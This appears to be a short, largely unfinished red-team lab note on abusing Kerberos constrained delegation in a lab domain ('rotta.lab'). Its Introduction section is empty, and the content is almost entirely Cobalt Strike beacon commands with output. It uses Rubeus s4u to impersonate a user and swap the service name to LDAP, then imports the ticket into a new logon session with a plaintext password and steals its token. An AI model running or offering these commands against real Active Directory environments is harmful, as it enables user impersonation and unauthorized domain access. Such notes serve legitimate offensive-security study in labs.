# Constrained Delegation



## Introduction





## Alternate Service Name

## Rubeus /altservice

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy 
/msdsspn:cifs/dc-2.rotta.lab /altservice:ldap /user:sql-2$ /ticket:<ticket> /nowrap

[*] Action: S4U

...


beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ROTTA /username:cfoxy 
/password:Password123! /ticket:<ticket>

[+] ProcessID       : 2580
[+] Ticket successfully imported!

...

beacon> steal_token 2580
```
